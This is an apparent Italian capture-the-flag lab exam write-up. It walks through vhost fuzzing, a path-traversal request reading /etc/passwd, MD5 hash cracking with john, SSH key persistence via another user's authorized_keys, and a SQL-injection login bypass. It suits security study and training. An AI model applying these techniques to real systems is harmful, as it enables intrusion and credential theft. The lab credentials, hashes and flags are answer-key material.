# EXAM01
## EXAM01_B2R01
```bash
sudo nmap -sC -sV -sS 192.168.14.39
```

* Mostra 3 porte aperte: `22, 80, 2000`
* La `2000` contiene una Internal CLI Management Console
## EXAM01_B2R02
![[Pasted image 20260622102317.png]]
Si suppone che `Melon Husk` sia il proprietario della piattaforma, e dunque e' ragionevole pensare che `socialipsilon.vdsi` sia il dominio cercato.

Procedo a inserire la entry `192.168.14.39 socialipsilon.vdsi` in `/etc/hosts`

## EXAM01_B2R03
Uso `ffuf` per fare un bruteforce sui `vhost`: 
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://socialipsilon.vdsi/ -H "HOST: FUZZ.socialipsilon.vdsi" -fs 8533
```
* `-fs`: la maggior parte delle richieste che faceva ritornavano una risposta con size `8533` dunque ho applicato questo filtro.

ottengo 3 risposte, andandole a visitare (inserendo gli host in `/etc/hosts`):
* `blog`: contiene la vera e propria **Internal Board**
* `api`: un portale per le api con tanto di link per la documentazione, completamente accessibile della REST API
* `chat`: porta ad un form di login apparentemente disabilitato
## EXAM01_B2R04
![[Pasted image 20260622104806.png]]
* **ora**: `10:45 AM`
* esiste una CLI Management Console, a cui posso accedere con la password `MichelleTiAmoPerSempre33!!` per l'utenza di `Baracco Barna`
* la password di `Baracco Barna` tutta via dovrebbe essere ancora la stessa utilizzata per `socialipsilon.vdsi`, e chiede di fare il log dei cambiamenti nella wiki interna.


**Documentazione API**: mostra `/v0/debug/to-delete/readstatusfile`

## EXAM01_B2R05
Su Y, Baracco Barna e' registrato con il nome utente `b.bama` (basta leggere un qualsiasi tweet), provando a caso la flag e': `b.bama:MichelleTiAmoPerSempre33!!`.

## EXAM01_B2R06
Avevo trovato in precedenza la porta 20000, che secondo `nmap` esegue un generico servizio `tcp`. 

Provando a connettermi con `netcat`, mi risponde la *Internal CLI Management Console*. Posso provare ad autenticarmi per conto di `b.bama`:
```bash
nc socialipsilon.vdsi 20000
# ... inserisco le credenziali ...
```

In risposta ottengo: `X-API-TOKEN: c4ca4238a0b923820dcc509a6f75849b`, che probabilmente server per autenticarmi per le REST API.

## EXAM01_B2R07
Precedentemente, con `ffuf`, avevamo trovato `http://api.socialipsilon.vdsi`. Infatti provandone qualcuna, effettivamente serve le richieste di API.

## EXAM01_B2R08
La API in questione e' `/v0/debug/to-delete/readstatusfile`. La descrizione riporta:
```
Internal Debug Endpoint: Read System Logs This endpoint is scheduled for deletion. It allows reading default log files to verify system status.
```

## EXAM01_B2R09
La vulnerabilita in questione e' sicuramente `Path Traversal`. Posso specificare un percorso a piacimento per il campo `file`.

Posso per esempio leggere `/etc/passwd` in questo modo:
```bash
curl http://api.socialipsilon.vdsi/v0/debug/to-delete/readstatusfile?file=../../../../etc/passwd -H "X-API-TOKEN: c4ca4238a0b923820dcc509a6f75849b"
```
## EXAM01_B2R10

Leggendo `/etc/passwd`, mi accorgo che l'hash della password di quel maniaco pazzo di `m.husk` e' `$1$D8SI0xAD$jvbgcpMCuKm0ntso9fWTE1`:
* `$1$` secondo il formato di `/etc/passwd` indica che l'hash e' un `MD5`

Dunque in questo modo posso ottenere la password originale:
![[Pasted image 20260622120332.png]]
* Nell'hash file ho messo direttamente la riga presa da `/etc/passwd`, poiche john riconosce che tipo di hash sto attaccando

Dunque la password e': `nikolatesla`

Una volta entrato con `ssh`:
```bash
$ chmod +x user.txt
$ ./user.txt
VDSI{M3lon_Husk_1s_H3r3}
```
per ottenere la flag.

## EXAM01_B2R10
Ho ottenuto l'accesso come `m.husk`.
Guardando `.bash_history` scopro che posso modificare `/home/d.truck/.ssh/authorized_keys`.
* `ssh-keygen`: genero una coppia di chiavi `ssh` da utilizzare.
* `cat .ssh/id_rsa.pub >> /home/d.truck/.ssh/authorized_keys`: faccio l'append della chiave pubblica generata in `authorized_keys` per `d.truck`
* `ssh d.truck@localhost`: accedo!
* `cat user.txt` per ottenere la flag.

# EXAM01_STNDA

## EXAM01_STNDA01
Il form probabilmente si interfaccia con un database sql, dunque provo a fare il login inserendo nel campo password: `' OR 1=1 --`, che da errore, confermando la presenza di un database

Allora ritento con: `' OR 1=1 #`, ottenendo l'accesso alla dashboard

# EXAM01_STNDB
## EXAM01_STNDB01
Con il seguente comando ottengo file piu nuovi:
```bash
find /{home,etc,opt,usr,var} -type f -newermt "10:00:00" 2>/dev/null
```

identificando cosi il file.